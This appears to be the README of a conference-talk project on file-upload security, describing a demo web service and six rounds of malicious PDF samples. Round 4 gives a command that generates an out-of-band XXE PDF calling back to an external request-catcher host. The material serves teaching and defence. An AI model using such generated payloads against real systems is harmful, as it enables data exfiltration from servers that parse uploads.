# Research on the security aspect of an file transfer implementation

## Introduction

💬 This folder contains all my work for the presentation proposed to the [VOXXED LU 2026](https://luxembourg.voxxeddays.com/en/) conference.

## Content

* 📄 Files:
  * [code.code-workspace](code.code-workspace): VScode workspace descriptor.
  * [pitch.docx](pitch.docx): Contains the synopsis, in french, of the presentation.
  * [presentation.pptx](presentation.pptx): Contains the presentation.
  * [presentation-schemas.md](presentation-schemas.md): Contains the schemas used into presentation created using [mermaid](https://mermaid.js.org/).
* 📂 Folders:
  * [app](app/): Contains the web service used for the context of the presentation (developed with [IntelliJ IDEA CE](https://www.jetbrains.com/idea/download/?section=windows)).
  * [scripts](scripts/): Contains utility scripts used for the preparation of the presentation.
  * [pdf-samples](pdf-samples/): Contains all the PDF files used for the presentation.

## PDF files

📦 The different PDF files used are stored in folder [pdf-samples](pdf-samples/) and named `round[sequence-id].pdf`.

🐞 Order to the file used, called **Round**:

* **Round n°1**: File that is an EXE renamed as PDF.
* **Round n°2**: File with JS code.
* **Round n°3**: File with an malicious attachement.
* **Round n°4**: File with an XXE in XFA form: `python xfa-xxe-poc-gen.py --mode oob --scheme https --ip righettod.requestcatcher.com --port 443 -o round4.pdf`
* **Round n°5**: File with malicious links.
* **Round n°6**: File with malicious file hidden concatenated.

## References

* <https://owasp.org/Top10/2025>
* <https://righettod.github.io/code-snippets-security-utils/eu/righettod/SecurityUtils.html#isPDFSafe(java.lang.String)>
* <https://nvd.nist.gov/developers>
* <https://github.com/mgthuramoemyint/POC-CVE-2025-54988>

# License

See [here](LICENSE).
